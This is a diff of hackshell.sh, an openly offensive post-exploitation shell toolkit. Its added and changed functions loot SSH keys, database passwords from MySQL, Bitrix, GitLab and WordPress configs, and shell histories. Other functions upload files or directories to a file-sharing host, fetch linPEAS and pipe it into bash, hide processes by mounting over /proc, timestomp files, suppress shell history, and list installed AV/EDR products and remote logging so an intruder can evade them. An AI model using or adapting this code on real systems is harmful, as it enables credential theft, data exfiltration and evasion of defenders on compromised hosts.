@@ -12,13 +12,16 @@
 # Usage:
 #     source <(curl -SsfL https://thc.org/hs)
 #     source <(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)
+#     source <(wget -qO-  https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)
 #
 # Environment variables (optional):
 #    XHOME=         Set custom XHOME directory [default: /dev/shm/.$'\t''~?$:?']
+#    HOMEDIR=       Loot location of /home [default: /home]
 #
-# 2024 by theM0ntarCann0n & skpr
+# 2024 by Messede, DoomeD, skpr
 
 _HSURL="https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh"
+_HSURLORIGIN="https://thc.org/hs"
 
 _hs_init_color() {
     [ -n "$CY" ] && return
@@ -36,7 +39,7 @@ _hs_init_color() {
     CDC="\033[0;36m" # cyan
     CF="\033[2m"    # faint
     CN="\033[0m"    # none
-    CW="\033[1;37m"
+    CW="\033[1;37m" # white
     CUL="\e[4m"
 }
 
@@ -112,7 +115,8 @@ source IPs use ${CDC}bounceinit 1.2.3.4/24 5.6.7.8/16 ...${CDM}"
 noansi() { sed -e 's/\x1b\[[0-9;]*m//g'; }
 alias nocol=noansi
 
-xlog() { local a=$(sed "/${1:?}/d" <"${2:?}") && echo "$a" >"${2:?}"; }
+xlog() { local a="$(sed "/${1:?}/d" <"${2:?}")" && echo "$a" >"${2:?}"; }
+
 xsu() {
     local name="${1:?}"
     local u g h
@@ -122,12 +126,13 @@ xsu() {
     u=$(id -u "${name:?}") || return
     g=$(id -g "${name:?}") || return
     h="$(grep "^${name}:" /etc/passwd | cut -d: -f6)"
-    echo "HOME=${h:-/tmp}"
+    # echo "HOME=${h:-/tmp}"
     # Not all systems support unset -n
     # unset -n _HS_HOME_ORIG
+    echo -e "May need to cut & paste: ' ${CDC}source <(curl -SsfL ${_HSURL})${CN}'"
     bak="$_HS_HOME_ORIG"
     unset _HS_HOME_ORIG
-    HOME="${h:-/tmp}" "${HS_PY:-python}" -c "import os;os.setgid(${g:?});os.setuid(${u:?});os.execlp('bash', 'bash')"
+    LOGNAME="${name}" USER="${name}" HOME="${h:-/tmp}" "${HS_PY:-python}" -c "import os;os.setgid(${g:?});os.setuid(${u:?});os.execlp('bash', 'bash')"
     export _HS_HOME_ORIG="$bak"
 }
 
@@ -148,12 +153,14 @@ xssh() {
             opts=("-oControlMaster=auto" "-oControlPath=\"${XHOME}/.ssh-unix.%C\"" "-oControlPersist=15")
         }
     }
-    echo -e "May need to cut & paste:  ${CDC}source <(curl -SsfL ${_HSURL})${CN}"
+    # If we use key then disable Password auth ('-oPasswordAuthentication=no' is not portable)
+    { [[ "$*" == *" -i"* ]] || [[ "$*" == "-i"* ]]; } && opts+=("-oBatchMode=yes")
+    echo -e "May need to cut & paste: ' ${CDC}source <(curl -SsfL ${_HSURL})${CN}'"
     stty raw -echo icrnl opost
     \ssh "${HS_SSH_OPT[@]}" "${opts[@]}" -T \
         "$@" \
         "unset SSH_CLIENT SSH_CONNECTION; LESSHISTFILE=- MYSQL_HISTFILE=/dev/null TERM=xterm-256color HISTFILE=/dev/null BASH_HISTORY=/dev/null exec -a [ntp] script -qc 'source <(resize 2>/dev/null); exec -a [uid] bash -i' /dev/null"
-    stty "${ttyp}"
+    [ -n "$ttyp" ] && stty "${ttyp}"
 }
 
 xscp() {
@@ -212,10 +219,11 @@ burl() {
 # burl http://ipinfo.io
 # PORT=31337 burl http://37.120.235.188/blah.tar.gz >blah.tar.gz
 
-# Execute a command without changing file's ctime/mtime/atime
+# Execute a command without changing file's ctime/mtime/atime/btime
 # notime <reference file> <cmd> ...
 # - notime . rm -f foo.dat
 # - notime foo chmod 700 foo
+# FIXME: Could use debugfs (https://righteousit.com/2024/09/04/more-on-ext4-timestamps-and-timestomping/)
 notime() {
     local ref="$1"
     local now
@@ -324,6 +332,14 @@ find_subdomains() {
 	grep -Eaohr "$rex" "$@" | grep -Eo "$rexf"
 }
 
+# echo -n "XOREncodeThisSecret" | xor 0xfa
+xor() {
+    _hs_dep perl
+    perl -e 'while(<>){foreach $c (split //){print $c^chr('"${1:-0xfa}"');}}'
+}
+
+xorpipe() { xor | sed 's/\r/\n/g'; }
+
 # HS_TRANSFER_PROVIDER="transfer.sh"
 HS_TRANSFER_PROVIDER="oshi.at"
 
@@ -331,14 +347,14 @@ transfer() {
     [[ $# -eq 0 ]] && { echo -e >&2 "Usage:\n    transfer [file/directory]\n    transfer [name] <FILENAME"; return 255; }
     [[ ! -t 0 ]] && { curl -SsfL --progress-bar -T "-" "https://${HS_TRANSFER_PROVIDER}/${1}"; return; }
     [[ ! -e "$1" ]] && { echo -e >&2 "Not found: $1"; return 255; }
-    [[ -d "$1" ]] && { (cd "${1}/.."; tar cfz - "${1##*/}")|curl -SsfL --progress-bar -T "-" "https://${HS_TRANSFER_PROVIDER}/${1##*/}.tar.gz"; return; }
-    curl -SsfL --progress-bar -T "$1" "https://${HS_TRANSFER_PROVIDER}/${1##*/}"
+    [[ -d "$1" ]] && { (cd "${1}/.." && tar cfz - "${1##*/}")|curl -SsfL --connect-timeout 7 --progress-bar -T "-" "https://${HS_TRANSFER_PROVIDER}/${1##*/}.tar.gz"; return; }
+    curl -SsfL --connect-timeout 7 --progress-bar -T "$1" "https://${HS_TRANSFER_PROVIDER}/${1##*/}"
 }
 
 # SHRED without shred command
 command -v shred >/dev/null || shred() {
     [[ -z $1 || ! -f "$1" ]] && { echo >&2 "shred [FILE]"; return 255; }
-    dd status=none bs=1k count=$(du -sk ${1:?} | cut -f1) if=/dev/urandom >"$1"
+    dd status=none bs=1k count="$(du -sk "${1:?}" | cut -f1)" if=/dev/urandom >"$1"
     rm -f "${1:?}"
 }
 
@@ -451,7 +467,7 @@ hide() {
         [ -n "$ts_d" ] && touch -t "$ts_d" /etc
         HS_WARN "Use ${CDC}ctime /etc /etc/mtab${CDM} to fix ctime"
     }
-    [[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && HS_INFO "PID $_pid is now hidden"; return; }
+    [[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm "/proc/$_pid" && HS_INFO "PID $_pid is now hidden"; return; }
     local _argstr
     for _x in "${@:2}"; do _argstr+=" '${_x//\'/\'\"\'\"\'}'"; done
     [[ $(bash -c "ps -o stat= -p \$\$") =~ \+ ]] || exec bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
@@ -593,7 +609,7 @@ hgrep() {
 }
 
 dbin() {
-    local cdir tfn
+    local cdir
     { [ -n "${XHOME}" ] && [ -f "${XHOME}/dbin" ]; } || { bin dbin || return; }
 
     cdir="${XHOME}/.dbin"
@@ -606,13 +622,13 @@ dbin() {
 }
 
 bin() {
-    local arch="$(uname -m)"
-    local arch_alt
-    local os="$(uname -s)"
+    local arch arch_alt os
     local a
     local single="${1}"
     local is_showhelp=1
 
+    arch="$(uname -m)"
+    os="$(uname -s)"
     [ -z "$os" ] && os="Linux"
     [ -z "$arch" ] && arch="x86_64"
     [ -n "$single" ] && {
@@ -623,6 +639,7 @@ bin() {
     a="${arch}"
     [ "$arch" == "x86_64" ] && arch_alt="amd64"
     [ "$arch" == "aarch64" ] && arch_alt="arm64"
+    [ -z "$arch_alt" ] && arch_alt="$arch"
     hs_mkxhome
     bin_dl() {
         local dst="${XHOME}/${1:?}"
@@ -715,26 +732,44 @@ bin() {
 
 loot_sshkey() {
     local str
-    local fn="${1:?}"
+    local fn="${1}"
 
     [ ! -s "${fn}" ] && return
     grep -Fqam1 'PRIVATE KEY' "${fn}" || return
 
-    [ -n "$_HS_SETSID_WAIT" ] && {
-        str="${CF}password protected"
-        setsid -w ssh-keygen -y -f "${fn}" </dev/null &>/dev/null && str="${CDR}NO PASSWORD"
-    }
-    echo -e "${CB}SSH-Key ${CDY}${fn}${CN} ${str}${CDY}${CF}"
+    if [ -n "$_HS_SETSID_WAIT" ]; then
+        str=" ${CF}password protected"
+        setsid -w ssh-keygen -y -f "${fn}" </dev/null &>/dev/null && str=" ${CDR}NO PASSWORD"
+    else 
+        grep -Fqam1 'ENCRYPTED' "${fn}" && str=" ${CF}password protected"
+    fi
+    echo -e "${CB}SSH-Key ${CDY}${fn}${CN}${str}${CDY}${CF}"
     cat "$fn"
+    echo -en "${CN}"
+}
+
+loot_gitlab() {
+    local fn="${1:?}"
+    local str
+    [ ! -f "$fn" ] && return
+    str="$(grep -i --color=never ^psql "${fn}")"
+    [ -z "$str" ] && return
+    echo -e "${CB}GitLab-DB ${CDY}${fn}${CF}"
+    echo "$str"
     echo -en "${CN}"
 }
 
 loot_bitrix() {
     local fn="${1:?}"
+    local str
     [ ! -f "$fn" ] && return
     grep -Fqam1 '$_ENV[' "$fn" && return
+    # 'password' => 'abcd',
+    # $DBPassword = 'abcd';
+    str="$(grep -i --color=never -E '(host|database|DBName|login|Password).*=.* ["'"'"']' "${fn}" | sed 's/\s*//g')"
+    [ -z "$str" ] && return
     echo -e "${CB}Bitrix-DB ${CDY}${fn}${CF}"
-    grep --color=never -E "(host|database|login|password)'.*=" "${fn}" | sed 's/\s*//g'
+    echo "$str"
     echo -en "${CN}"
 }
 
@@ -752,8 +787,9 @@ _loot_wp() {
 
 # _loot_home <NAME> <filename>
 _loot_homes() {
-    local fn
-    for fn in "${HOMEDIR:-/home}"/*/"${2:?}" /root/"${2}"; do
+    local fn hn
+    for hn in "${HOMEDIRARR[@]}"; do
+        fn="${hn}/${2:?}"
         [ ! -s "$fn" ] && continue
         echo -e "${CB}${1:-CREDS} ${CDY}${fn}${CF}"
         cat "$fn"
@@ -868,6 +904,182 @@ gsnc() {
 }
 command -v gs-netcat >/dev/null || gs-netcat() { gsnc "$@"; }
 
+# https://github.com/hackerschoice/hackshell/issues/6
+_warn_edr() {
+    local fns s out
+
+    fns=()
+    _hs_chk_systemd() { systemctl is-active "${1:?}" &>/dev/null && out+="${2:?}: systemctl status $1"$'\n';}
+    _hs_chk_fn() { { [ -z "${1}" ] || [ ! -e "${1:?}" ]; } && return; fns+=("${1:?}"); out+="${2:?}: $1"$'\n';}
+
+    _hs_chk_fn "/usr/lib/Acronis"                           "Acronis Cyber Protect"
+    _hs_chk_fn "/etc/init.d/avast"                          "Avast"
+    _hs_chk_fn "/var/lib/avast/Setup/avast.vpsupdate"       "Avast"
+    _hs_chk_fn "/etc/init.d/avgd"                           "AVG"
+    _hs_chk_fn "/opt/avg"                                   "AVG"
+    _hs_chk_fn "/var/log/checkpoint"                        "Checkpoint"
+    _hs_chk_fn "/opt/cisco/amp/bin/ampcli"                  "Cisco Secure Endpoint"
+    _hs_chk_fn "/etc/clamd.d/scan.conf"                     "ClamAV"
+    _hs_chk_fn "$(command -v clamscan)"                     "ClamAV"
+    _hs_chk_fn "/etc/freshclam.conf"                        "ClamAV"
+    _hs_chk_fn "/opt/COMODO"                                "Comodo AV"
+    _hs_chk_fn "/opt/CrowdStrike"                           "CrowdShite"
+    _hs_chk_fn "/opt/cyberark"                              "CyberArk"
+    _hs_chk_fn "/opt/360sdforcnos"                          "EDR ?"
+    _hs_chk_fn "/etc/filebeat"                              "Filebeat (not AV/EDR, but used to ship logs)"
+    _hs_chk_fn "/opt/fireeye"                               "FireEye/Trellix EDR"
+    _hs_chk_fn "/opt/isec"                                  "FireEye/Trellix Endpoint Security"
+    _hs_chk_fn "/opt/McAfee"                                "FireEye/McAfee/Trellix Agent"
+    _hs_chk_fn "/opt/Trellix"                               "FireEye/McAfee/Trellix SIEM Collector"
+    _hs_chk_fn "/opt/FortiEDRCollector"                     "Fortinet FortiEDR"
+    _hs_chk_fn "/opt/fortinet/fortisiem"                    "Fortinet FortiSIEM"
+    _hs_chk_fn "/etc/init.d/fortisiem-linux-agent"          "Fortinet FortiSIEM"
+    _hs_chk_fn "/usr/local/bin/intezer-analyze"             "Intezer"
+    _hs_chk_fn "/opt/kaspersky"                             "Kaspersky"
+    _hs_chk_fn "/etc/init.d/kics"                           "Kaspersky Industrial CyberSecurity"
+    _hs_chk_fn "/usr/local/rocketcyber"                     "Kseya RocketCyber"
+    _hs_chk_fn "/etc/init.d/limacharlie"                    "LimaCharlie Agent"
+    _hs_chk_fn "/etc/logrhythm"                             "LogRhythm Axon"
+    _hs_chk_fn "/bin/logrhythm"                             "LogRhythm Axon"
+    _hs_chk_fn "opt/logrhythm/scsm"                         "LogRhythm System Monitor"
+    _hs_chk_fn "/etc/init.d/scsm"                           "LogRhythm System Monitor"
+    _hs_chk_fn "/var/pt"                                    "PT Swarm"
+    _hs_chk_fn "/usr/local/qualys"                          "Qualys EDR Cloud Agent"
+    _hs_chk_fn "/etc/init.d/qualys-cloud-agent"             "Qualys EDR Cloud Agent"
+    _hs_chk_fn "/etc/rkhunter.conf"                         "RootKit Hunter"
+    _hs_chk_fn "$(command -v rkhunter)"                     "RootKit Hunter"
+    _hs_chk_fn "/etc/safedog/sdsvrd.conf"                   "Safedog"
+    _hs_chk_fn "/etc/safedog/server/conf/sdsvrd.conf"       "Safedog"
+    _hs_chk_fn "/sf/edr/agent/bin/edr_agent"                "Sangfor EDR"
+    _hs_chk_fn "/opt/secureworks"                           "Secureworks"
+    _hs_chk_fn "/opt/splunkforwarder"                       "Splunk"
+    _hs_chk_fn "/opt/SumoCollector"                         "Sumo Logic Cloud SIEM"
+    _hs_chk_fn "/etc/otelcol-sumo/sumologic.yaml"           "Sumo Logic OTEL Collector"
+    _hs_chk_fn "/opt/Symantec"                              "Symantec EDR"
+    _hs_chk_fn "/etc/init.d/sisamdagent"                    "Symantec EDR"
+    _hs_chk_fn "/usr/lib/symantec/status.sh"                "Symantec Linux Agent"
+    _hs_chk_fn "/opt/Tanium"                                "Tanium"
+    _hs_chk_fn "/opt/threatbook/OneAV"                      "threatbook.OneAV"
+    _hs_chk_fn "/usr/bin/oneav_start"                       "threatbook.OneAV"
+    _hs_chk_fn "/opt/threatconnect-envsvr/"                 "ThreatConnect"
+    _hs_chk_fn "/etc/init.d/threatconnect-envsvr"           "ThreatConnect"
+    _hs_chk_fn "/titan/agent/agent_update.sh"               "Titan Agent"
+    _hs_chk_fn "/etc/init.d/ds_agent"                       "Trend Micro Deep Instinct"
+    _hs_chk_fn "/opt/ds_agent/dsa"                          "Trend Micro Deep Security Agent"
+    _hs_chk_fn "/etc/init.d/splx"                           "Trend Micro Server Protect"
+    _hs_chk_fn "/etc/opt/f-secure"                          "WithSecure (F-Secure)"
+    _hs_chk_fn "/opt/f-secure"                              "WithSecure (F-Secure)"
+
+    [ "${#fns[@]}" -gt 0 ] && out+="$(\ls -alrtd "${fns[@]}")"$'\n'
+
+    _hs_chk_systemd "avast"                             "Avast"
+    _hs_chk_systemd "bdsec"                             "Bitdefender EDR / GavityZone XDR"
+    _hs_chk_systemd "cylancesvc"                        "Blackberry cyPROTECT"
+    _hs_chk_systemd "cyoptics"                          "Blackberry cyOPTICS"
+    _hs_chk_systemd "cbsensor"                          "CarbonBlack"
+    _hs_chk_systemd "cpla"                              "Checkpoint"
+    _hs_chk_systemd "itsm"                              "Comodo Client Security"
+    _hs_chk_systemd "falcon-sensor"                     "CrowdStrike"
+    _hs_chk_systemd "epmd"                              "CyberArk"
+    _hs_chk_systemd "cybereason-sensor"                 "Cybereason"
+    _hs_chk_systemd "elastic-agent"                     "Elastic Security"
+    _hs_chk_systemd "sraagent"                          "ESET Endpoint Security"
+    _hs_chk_systemd "eraagent"                          "ESET Endpoint Security"
+    _hs_chk_systemd "eea"                               "ESET AV"
+    _hs_chk_systemd "eea-user-agent"                    "ESET AV agent"
+    _hs_chk_systemd "xagt"                              "FireEye/Trellix EDR"
+    _hs_chk_systemd "keeperx"                           "IBM QRADAR"
+    _hs_chk_systemd "kesl"                              "Kaspersky Endpoint Security"
+    _hs_chk_systemd "klnagent64"                        "Kaspersky Network Agent"
+    _hs_chk_systemd "kesl-supervisor"                   "Kaspersky Endpoint Security (Elbrus Edition)"
+    _hs_chk_systemd "kics"                              "Kaspersky Industrial CyberSecurity"
+    _hs_chk_systemd "kess"                              "Kaspersky Embedded Systems Security"
+    _hs_chk_systemd "rocketcyber"                       "Kseya RocketCyber"
+    _hs_chk_systemd "limacharlie"                       "LimaCharlie Agent"
+    _hs_chk_systemd "lr-agent.logrhythm"                "LogRhythm Axon"
+    _hs_chk_systemd "MFEcma"                            "McAfee"
+    _hs_chk_systemd "mdatp"                             "MS defender"
+    _hs_chk_systemd "osqueryd"                          "OSQuery"
+    _hs_chk_systemd "traps_pmd"                         "Palo Alto Networks Cortex XDR"
+    _hs_chk_systemd "ir_agent"                          "Rapid7 INSIGHT IDR"
+    _hs_chk_systemd "armor"                             "Rapid7 NG AV"
+    _hs_chk_systemd "sophoslinuxsensor"                 "Sophos Intercept X"
+    _hs_chk_systemd "sophos-spl"                        "Sophos SPL"
+    _hs_chk_systemd "otelcol-sumo"                      "Sumo Logic OTEL Collector"
+    _hs_chk_systemd "ds_agent"                          "TrendMicro - Deep Instinct"
+    _hs_chk_systemd "titanagent"                        "Titanagent EDR"
+    _hs_chk_systemd "taniumclient"                      "Tanium"
+    _hs_chk_systemd "oneavd"                            "threatbook.OneAV"
+    _hs_chk_systemd "mbdaemon"                          "ThreatDown (MalwareBytes) Nebula EDR Agent"
+    _hs_chk_systemd "wazuh-agent"                       "Wazuh"
+    _hs_chk_systemd "emit_scand_service"                "WithSecure (F-Secure) Elements Agent"
+    _hs_chk_systemd "f-secure-linuxsecurity-activate"   "WithSecure (F-Secure) Elements Agent"
+
+    [ -n "$out" ] && {
+        echo -e "${CR}AV/EDR found ${CF}"
+        echo -n "$out"
+        echo -en "${CN}"
+    }
+
+    unset out
+    s="$(grep -v '^#' rsyslog.conf /etc/rsyslog.d/*.conf 2>/dev/null | grep -F ' @@')" && out="$s"$'\n'
+    [ -n "$out" ] && {
+        echo -e "${CR}Remote Logging detected${CF}"
+        echo -n "$out"
+        echo -en "${CN}"
+    }
+
+    unset -f _hs_chk_systemd _hs_chk_fn
+}
+
+# Warn if there are other root kits found.
+_warn_rk() {
+    local n=0
+    local tainted
+    local str
+
+    [ -e "/proc/sys/kernel/tainted" ] && n="$(</proc/sys/kernel/tainted)"
+    # https://docs.kernel.org/admin-guide/tainted-kernels.html#decoding-tainted-state-at-runtime
+    # Check for Proprietary(0), out-of-tree(12) and unsigned(13)
+    [ "$n" -gt 0 ] && { [ $((n & 1)) -eq 1 ] || [ $((n>>12 & 1)) -eq 1 ] || [ $((n>>13 & 1)) -eq 1 ]; } && tainted=1
+
+    [ -n "$tainted" ] && {
+        echo -e "${CR}Non standard LKM detected${CF} (/proc/sys/kernel/tainted=$n)"
+        command -v modinfo >/dev/null && cat "/proc/modules" 2>/dev/null | while read -r m; do
+            m="${m%% *}"
+            str="$(modinfo "$m")"
+            { [[ "$str" != *"Build time autogenerated kernel"* ]] || [[ "$str" != *"intree:         Y"* ]]; } && {
+                # echo "$m"
+                modinfo "$m" | grep --color=never -E '(^filename|^author)'
+                continue
+            }
+        done
+        echo -en "${CN}"
+    }
+}
+
+_hs_gen_home() {
+    local IFS
+    local str
+    unset HOMEDIRARR
+
+    if [ -n "$HOMEDIR" ]; then
+        if [ -d "$HOMEDIR" ]; then
+            str="$({ find "${HOMEDIR}" -mindepth 1 -maxdepth 1 -type d; } | sort -u)"
+        else
+            HS_WARN "Directory not found: HOMEDIR='${HOMEDIR}'"
+        fi
+    else
+        # str="$({ find "${HOMEDIR:-/home}" -mindepth 1 -maxdepth 1 -type d; awk -F':' '{print $6}' </etc/passwd 2>/dev/null | while read -r d; do [ -d "$d" ] && echo "$d"; done; [ -d /var/www ] && echo "/var/www"; } | sort -u)"
+        str="$({ find "${HOMEDIR:-/home}" -mindepth 1 -maxdepth 1 -type d; awk -F':' '{print $6}' </etc/passwd 2>/dev/null | while read -r d; do [ ! -d "$d" ] && continue; [[ "$d" == "/" || "$d" == "/bin" || "$d" == "/sbin" ]] && continue; echo "$d"; done; } | sort -u)"
+        [ -d /var/www ] && [[ "$str" != *"/var/www"* ]] && str+="/var/www"$'\n'
+    fi
+
+    set -f
+    IFS=$'\n' HOMEDIRARR=($str)
+    set +f
+}
+
 lootlight() {
     local str
     ls -al /tmp/ssh-* &>/dev/null && {
@@ -921,6 +1133,95 @@ lootlight() {
         echo "${str}"
         echo -e "${CN}"
     }
+
+    _warn_edr
+    _warn_rk
+}
+
+lootmore() {
+    local hn fn str arr
+    _hs_gen_home
+
+    # Find interesting commands in history file
+    for hn in "${HOMEDIRARR[@]}"; do
+        fn=()
+        [ -f "${hn}/.bash_history" ] && fn+=("${hn}/.bash_history")
+        [ -f "${hn}/.zsh_history" ] && fn+=("${hn}/.zsh_history")
+        [ ${#fn[@]} -eq 0 ] && continue
+        str="$(grep -h -e ^ssh -e ^scp -e ^sftp -e ^rsync -e ^git -e ^rclone "${fn[@]}" 2>/dev/null | sort -u)"
+
+        [ -z "$str" ] && continue
+        echo -e "${CB}Interesting commands ${CDY}${hn}/.[bash|zsh]_history${CF}"
+        echo "$str"
+        echo -en "${CN}"
+    done
+
+    command -v lastlog >/dev/null && {
+        echo -e "${CB}Logins ${CDY}${CF}"
+        lastlog | grep -vF 'Never logged'
+        echo -en "${CN}"
+    }
+    command -v last >/dev/null && {
+        echo -e "${CB}Last Logins ${CDY}${CF}"
+        last -i -n20
+        echo -en "${CN}"
+    }
+
+    str="$(dmesg -T 2>/dev/null | tail -n 10)"
+    [ -n "$str" ] && {
+        echo -e "${CB}dmesg ${CDY}${CF}"
+        echo "$str"
+        echo -en "${CN}"
+    }
+
+    command -v docker >/dev/null && {
+        str="$(docker ps -a)"
+        [ -n "$str" ] && {
+            echo -e "${CB}Docker ${CDY}${CF}"
+            echo "$str"
+            echo -en "${CN}"
+        }
+    }
+    # Execute in subshell so that 'source' does not mess with our variables.
+    (source /etc/apache2/envvars 2>/dev/null && {
+        unset str
+        set -f
+        IFS=$'\n' arr=($(ps auxw|awk '{print $11}'|grep -e "[a]pache" -e "[h]ttpd"|grep -v lighttpd|sort -u))
+        set +f
+        for b in "${arr[@]}"; do
+            grep -Fqs apr_socket_timeout_set "$b" || continue
+            str+="$("$b" -t -D DUMP_VHOSTS 2>&1)" || continue
+        done
+        [ -n "$str" ] && {
+            echo -e "${CB}Apache Config ${CDY}${CF}"
+            echo "$str"
+            echo -en "${CN}"
+        }
+    })
+
+    str="$(grep -sE '^[[:digit:]]' /etc/hosts |grep -vF -e localhost -e 127.0.0.1)"
+    [ -n "$str" ] && {
+        echo -e "${CB}/etc/hosts ${CDY}${CF}"
+        echo "$str"
+        echo -en "${CN}"
+    }
+
+    unset HOMEDIRARR
+    echo -e "${CW}TIP:${CN} Type ${CDC}ws${CN} to find out more about this host."
+}
+
+# <NAME> <COMMAND> ...
+loot_cmd() {
+    local name="$1"
+    local str
+
+    shift 1
+    str="$("$@" 2>/dev/null)" || return #cmd failed
+    [ -z "$str" ] && return
+
+    echo -e "${CB}${name}${CDY}${CF}"
+    echo "$str"
+    echo -en "${CN}"
 }
 
 # Someone shall implement a sub-set from TeamTNT's tricks (use
@@ -929,34 +1230,38 @@ lootlight() {
 # https://www.cadosecurity.com/blog/the-nine-lives-of-commando-cat-analysing-a-novel-malware-campaign-targeting-docker
 loot() {
     local h="${_HS_HOME_ORIG:-$HOME}"
-    local str
+    local str hn fn
 
+    _hs_gen_home
     unset _HS_GOT_SSRF_169
-    for fn in "${HOMEDIR:-/home}"/*/.my.cnf /root/.my.cnf; do
+    
+    for hn in "${HOMEDIRARR[@]}"; do
+        fn="${hn}/.my.cnf"
         [ ! -s "$fn" ] && continue
         echo -e "${CB}MySQL ${CDY}${fn}${CF}"
         grep -vE "^(#|\[)" <"${fn}"
         echo -en "${CN}"
         # grep -E "^(user|password)" "${h}/.my"
     done
-    for fn in "${HOMEDIR:-/home}"/*/.mysql_history /root/.mysql_history; do
+    for hn in "${HOMEDIRARR[@]}"; do
+        fn="${hn}/.mysql_history"
         [ ! -s "$fn" ] && continue
-        str=$(grep -ia '^SET PASSWORD FOR' "$fn") || continue
+        str=$(grep -ia '^SET PASSWORD FOR' "$fn" 2>/dev/null) || continue
         echo -e "${CB}MySQL ${CDY}${fn}${CF}"
         echo "$str"
         echo -en "${CN}"
     done
 
     ### Bitrix
-    for fn in "${HOMEDIR:-/home}"/*/*/bitrix/.settings.php; do
+    # HOMEDIRARR includes all from /etc/passwd + /var/www 
+    find "${HOMEDIRARR[@]}" -maxdepth 6 -type f -wholename "*/bitrix/.settings.php" -o -wholename "*/bitrix/php_interface/dbconn.php" 2>/dev/null | while read -r fn; do
         loot_bitrix "$fn"
     done
 
-    find /var/www -maxdepth 6 -type f -wholename "*/bitrix/.settings.php" 2>/dev/null | while read -r fn; do
-        loot_bitrix "$fn"
-    done
+    loot_gitlab /opt/gitlab/etc/gitlab-psql-rc
+    loot_gitlab /etc/gitlab-psql-rc
 
-    find /var/www "${h}" -maxdepth 3 -type f -name wp-config.php 2>/dev/null | while read -r fn; do
+    find "${HOMEDIRARR[@]}" -maxdepth 4 -type f -name wp-config.php 2>/dev/null | while read -r fn; do
         _loot_wp "$fn"
     done
 
@@ -998,11 +1303,16 @@ loot() {
         }
     }
 
-    [ "$UID" -ne 0 ] && {
-        echo -e "${CW}TIP:${CN} Type ${CDC}sudo -ln${CN} to list sudo perms. ${CF}[may log to auth.log]${CN}"
+    loot_cmd "Screen (screen -ls)" screen -ls
+    loot_cmd "Tmux" tmux list-s
+
+    [ "$UID" -gt 0 ] && {
+        echo -e "${CW}TIP:${CN} Type ${CDC}sudo -v${CN} and ${CDC}sudo -ln${CN} to list sudo perms. ${CF}[may log to auth.log]${CN}"
     }
 
     lootlight
+    unset HOMEDIRARR
+    echo -e "${CW}TIP:${CN} Type ${CDC}lootmore${CN} to loot even more."
 }
 
 # Try to find LPE
@@ -1016,7 +1326,7 @@ lpe() {
             echo -e "${CB}Running linPEAS...${CN}"
             dl 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh' | bash
             ;;
-        CYGWIN*|MINGW*|MSYS*|MINGW32*|MINGW64*|MSYS_NT*)
+        CYGWIN*|MINGW*|MSYS*)
             echo -e "${CB}Running winPEAS...${CN}"
             if command -v powershell >/dev/null 2>&1; then
                 echo -e "${CB}Using PowerShell to download and execute winPEAS...${CN}"
@@ -1153,6 +1463,7 @@ hs_exit() {
 
 ### Functions (temporary)
 hs_init_dl() {
+    local str
     # Ignore TLS certificate. This is DANGEROUS but many hosts have missing ca-bundles or TLS-Proxies.
     if which curl &>/dev/null; then
         _HS_SSL_ERR="certificate "
@@ -1163,11 +1474,17 @@ hs_init_dl() {
         }
     elif which wget &>/dev/null; then
         _HS_SSL_ERR="is not trusted"
+        str="$(wget --help 2>&1)"
+        if [[ "$str" == *"connect-timeout"* ]]; then
+            _HS_WGET_OPTS=("--connect-timeout=7" "--dns-timeout=7")
+        elif [[ "$str" == *"-T SEC" ]]; then
+            _HS_WGET_OPTS=("-T" "7")
+        fi
         dl() {
             local opts=()
             [ -n "$UNSAFE" ] && opts=("--no-check-certificate")
             # Can not use '-q' here because that also silences SSL/Cert errors
-            wget -O- "${opts[@]}" --connect-timeout=7 --dns-timeout=7 "${1:?}"
+            wget -O- "${opts[@]}" "${_HS_WGET_OPTS[@]}" "${1:?}"
         }
     elif [ -n "$HS_PY" ]; then
         dl() { purl "$@"; }
@@ -1235,6 +1552,9 @@ ${CY}>>>>> ${CDC}curl -obash -SsfL '$str' && chmod 700 bash && exec ./bash -il"
         # User can set SSH_NO_OLD before hs to disable old ciphers.
         [ -z "$SSH_NO_OLD" ] && \ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -V 2>/dev/null && HS_SSH_OPT+=("-oKexAlgorithms=+diffie-hellman-group1-sha1")
         [ -z "$SSH_NO_OLD" ] && \ssh -oHostKeyAlgorithms=+ssh-dss -V 2>/dev/null && HS_SSH_OPT+=("-oHostKeyAlgorithms=+ssh-dss")
+        [ -z "$SSH_NO_OLD" ] && \ssh -oCiphers=+aes128-cbc -V 2>/dev/null && HS_SSH_OPT+=("-oCiphers=+aes128-cbc")
+        [ -z "$SSH_NO_OLD" ] && \ssh -oCiphers=+3des-cbc -V 2>/dev/null && HS_SSH_OPT+=("-oCiphers=+3des-cbc")
+
         HS_SSH_OPT+=("-oConnectTimeout=5")
         HS_SSH_OPT+=("-oServerAliveInterval=30")
     }
@@ -1254,7 +1574,7 @@ cn() {
     x509="$(timeout "${HS_TO_OPTS[@]}" 2 openssl s_client -showcerts -connect "${1:?}:${2:-443}" 2>/dev/null </dev/null)"
     # Extract CN
     str="$(echo "$x509" | openssl x509 -noout -subject 2>/dev/null)"
-    [[ "$str" == "subject"* ]] && [[ "$str" != *"/CN"* ]] && {
+    [[ "$str" == "subject"* ]] && [[ "$str" == *"/CN"* ]] && {
         str="$(echo "$str" | sed '/^subject/s/^.*CN.*=[ ]*//g')"
         echo "$str"
     }
@@ -1366,7 +1686,7 @@ ${CDC} bounce <port> <dst-ip> <dst-port>     ${CDM}Bounce tcp traffic to destina
 ${CDC} ghostip                               ${CDM}Originate from a non-existing IP
 ${CDC} burl http://ipinfo.io 2>/dev/null     ${CDM}Request URL ${CN}${CF}[no https support]
 ${CDC} dl http://ipinfo.io 2>/dev/null       ${CDM}Request URL using one of curl/wget/python/perl/openssl
-${CDC} transfer ~/.ssh                       ${CDM}Upload a file or directory ${CN}${CF}[${HS_TRANSFER_PROVIDER}]
+${CDC} transfer <file>                       ${CDM}Upload a file or directory ${CN}${CF}[${HS_TRANSFER_PROVIDER}]
 ${CDC} shred file                            ${CDM}Securely delete a file
 ${CDC} notime <file> touch foo.dat           ${CDM}Execute a command at the <file>'s mtime
